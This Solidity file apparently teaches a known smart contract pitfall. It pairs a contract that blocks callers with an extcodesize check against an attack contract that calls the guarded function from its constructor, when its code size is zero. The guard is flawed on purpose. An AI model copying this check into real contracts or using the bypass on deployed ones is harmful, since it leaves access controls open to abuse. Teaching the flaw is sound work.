// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/// @title SizeCheckContract
/// @notice A contract that checks if an address is a contract by inspecting its bytecode size.
contract SizeCheckContract {
    /// @notice Checks if the given address is a contract.
    /// @param account The address to check.
    /// @return Returns true if the address is a contract, false otherwise.
    function isContract(address account) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    /// @notice A protected function that can only be called by non-contract addresses.
    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

/// @title SizeCheckAttack
/// @notice A contract representing an attack on the SizeCheckContract by attempting to bypass the contract check.
contract SizeCheckAttack {
    bool public isContract;
    address public addr;

    /// @notice Constructs the SizeCheckAttack contract, specifying the target contract and performing the attack.
    /// @param _target The address of the SizeCheckContract to attack.
    constructor(address _target) {
        // Checks if the current contract (SizeCheckAttack) is considered a contract by the target contract.
        isContract = SizeCheckContract(_target).isContract(address(this));
        addr = address(this);
        // Calls the protected function of the target contract.
        SizeCheckContract(_target).protected();
    }
}